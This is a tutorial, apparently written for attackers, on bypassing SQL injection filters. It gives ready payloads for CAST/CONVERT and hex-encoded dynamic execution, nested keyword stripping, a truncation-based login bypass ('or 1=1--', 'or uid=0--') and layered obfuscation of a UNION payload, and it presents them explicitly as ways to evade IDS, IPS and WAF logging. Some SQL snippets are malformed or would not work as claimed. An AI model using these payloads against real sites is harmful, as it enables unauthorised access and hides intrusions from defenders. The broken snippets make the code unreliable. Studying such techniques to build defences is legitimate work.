
---

# Advanced SQL injection filter bypassing #

---


Multiple layers of mutation can be applied into an SQL injection payload. Applying more than one mutation to an SQL injection payload does not mean necessarily that there is a filter for each mutation applied to the payload, it just means that a mutated payload is increasing each chances to bypass a web application filter, if there is one. Of course you do need to manually identify the type of filtering that takes place.  Another side effect of this type of multilayer mutation is that the sql injection attacks cannot be identified from the various Web Application and Web Proxy logs easily by a simple visual inspection (e.g. a syslog logging all mutated sql injections will not do much help).

**Note:** This tutorial is going to expand on other type of payload obfuscation such as path traversal and XSS obfuscation. Soon I am going to add more functionality in my script.

## Using the CAST and CONVERT keywords ##

Another subcategory of encoding attacks is the CAST and CONVERT attack. The CAST and CONVERT keyword explicitly converts an expression of one data type to another more over the CAST keyword is embedded to MySQL, MSSQL and Postgre databases. It has been used by various types of malware attacks in numerous web sites and is a very interesting SQL injection filter bypass. The most infamous botnet that used this type of attack was ASPRox botnet virus. Have a look at the syntax:

Using CAST:

> _CAST ( expression AS data\_type )_

Using CONVERT:

> _CONVERT ( data\_type [( length ) ](.md) , expression [, style ](.md) )_

With CAST and CONVERT you have similar filtering by passing results with with the function SUBSTRING, an example can show you what I mean. The following SQL queries will return the same result back:

SELECT SUBSTRING('CAST and CONVERT', 1, 4)

Returned result: CAST

SELECT CAST('CAST and CONVERT' AS char(4))

Returned result: CAST

SELECT CONVERT(varchar,'CAST',1)

Returned result: CAST

**Note:** See that both SUBSTRING and CAST keywords behave the same and can also be used for blind SQL injection attacks (you can try to test this queries with sqlzoo.net).

Further expanding on CONVERT and CAST we can identify that also the following SQL queries are valid and also very interesting, see how we can extract the MSSQL database version with CAST and CONVERT:

**1st Step:** Identify the query to execute:

SELECT @@VERSION

**2nd Step:** Construct the query based on keywords CAST and CONVERT:


SELECT CAST('SELECT @@VERSION' AS VARCHAR(16))

OR

SELECT CONVERT(VARCHAR,'SELECT @@VERSION',1)

**3rd Step:** Execute the query using the keyword EXEC:

SET @sqlcommand =  SELECT CONVERT(VARCHAR,'SELECT @@VERSION',1)

EXEC(@sqlcommand)

OR convert first the SELECT @@VERSION to Hex

SET @sqlcommand =  (SELECT CAST(0x53454C45435420404076657273696F6E00 AS VARCHAR(34))

EXEC(@sqlcommand)

**Note:** See how creative you can become with CAST and CONVERT. Now since the type of data that is contained in the sentence CAST is hexadecimal a varchar conversion is performed.

You can also use nested CAST and CONVERT queries to inject your malicious input. That way you can start interchanging between different encoding types and create more complicated queries. This should be a good example:

CAST(CAST(PAYLOAD IN HEX, VARCHAR(CHARACTER LENGTH OF PAYLOAD)),, VARCHAR(CHARACTER LENGTH OF TOTAL PAYLOAD)

## Nesting Stripped Expressions ##

Some sanitizing filters strip certain characters or expressions from user input, and then process the remaining data in the usual way. If an expression that is being stripped contains two or more characters, and the filter is not applied recursively, you can normally defeat the filter by nesting the banned expression inside itself.

For example, if the SQL keyword SELECT is being stripped from your input, you can use the following input to defeat the filter:

SELSELECTECT

**Note:** See the simplicity of bypassing the stupid filter.

## Exploiting Truncation ##

Sanitizing filters often perform several operations on user-supplied data, and occasionally one of the steps is to truncate the input to a maximum length, perhaps in an effort to prevent buffer overflow attacks, or accommodate data within database fields that have a predefined maximum length.Consider a login function which performs the following SQL query, incorporating two items of user-supplied input:

SELECT uid FROM tblUsers WHERE username = 'jlo' AND password = 'r1Mj06'

Suppose the application employs a sanitizing filter, which performs the following steps:

Doubles up quotation marks, replacing each instance of a single quote (‘) with two single quotes (“)
Truncates each item to 16 characters. If you supply a typical SQL injection attack vector such as:

admin'--

The following query will be executed, and your attack will fail:

SELECT uid FROM tblUsers WHERE username = 'admin''--' AND password = ''

**Note:** The doubled-up quotes mean that your input fails to terminate the username string, and so the query actually checks for a user with the literal username you supplied. However, if you instead supply the username aaaaaaaaaaaaaaa' which contains 15 a’s and one quotation mark, the application first doubles up the quote, resulting in a 17-character string, and then removes the additional quote by truncating to 16 characters. This enables you to smuggle an unescaped quotation mark into the query, thus interfering with its syntax:

SELECT uid FROM tblUsers WHERE username = 'aaaaaaaaaaaaaaa'' AND password = ''

**Note:** This initial attack results in an error, because you effectively have an unterminated string

Each pair of quotes following the a’s represents an escaped quote, and there is no final quote to delimit the user-name string. However, because you have a second insertion point, in the password field, you can restore the syntactic validity of the query, and bypass the login, by also supplying the following password:

or 1=1--

This causes the application to perform the following query:

SELECT uid FROM tblUsers WHERE username = 'aaaaaaaaaaaaaaa'' AND password = 'or 1=1--'

When the database executes this query, it checks for table entries where the literal username is

aaaaaaaaaaaaaaa' AND password =

which is presumably always false, or where 1 = 1, which is always true. Hence, the query will return the UID of every user in the table, typically causing the application to log you in as the first user in the table. To log in as a specific user (e.g., with UID 0), you would supply a password such as the following:

or uid=0--

**Note:** This query is considered to be a very old technique used for authentication bypass or privilege escalation.

## Using multiple layers of payload obfuscation ##

In order to bypass complex SQL injection filters you might have to use multiple layers of obfuscation. Some examples below can make you understand what I mean:

  * **Original payload**

' union (select @@version) --

  * **First example**

Layer 1: Dynamic query execution using concatenations

' uni'+'on (se'+'lect @@ver'+'sion) --

Layer 2: Space filling using url encoded space %20

' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--

Layer 3: Null byte bypass added as a postfix

' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--%00

  * **Second example**

Layer 1: Dynamic query execution using concatenations

' uni'+'on (se'+'lect @@ver'+'sion) --

Layer 2: Space filling using url encoded space %20

' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--

Layer 3: Base 64 encoding

JyB1bmknKydvbiUyMChzZScrJ2xlY3QlMjBAQHZlcicrJ3Npb24pJTIwLS0=

  * **Third example**

Layer 1: Dynamic query execution using concatenations

' uni'+'on (se'+'lect @@ver'+'sion) --

Layer 2: Space filling using url encoded space %20

' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--

Layer 3: Ascii hex encode

2720756e69272b276f6e253230287365272b276c6563742532304040766572272b2773696f6e292532302d2d

Layer 4: CAST mutation

SET @sqlcommand =  (SELECT CAST(0x2720756e69272b276f6e253230287365272b276c6563742532304040766572272b2773696f6e292532302d2d AS VARCHAR(length))

**Note:** The mutation layers should be applied in such a way so as not to break the SQL injection payload.

## Epilogue ##

Multilayer payload mutation means payload optimization. Multilayer SQL payload mutation also means hiding traces bypassing Intrusion Prevention, Intrusion Detection (IPS/IDS), Firewall and Web Application Firewall (WAF) filters. It also means that black list filtering is not sufficient.



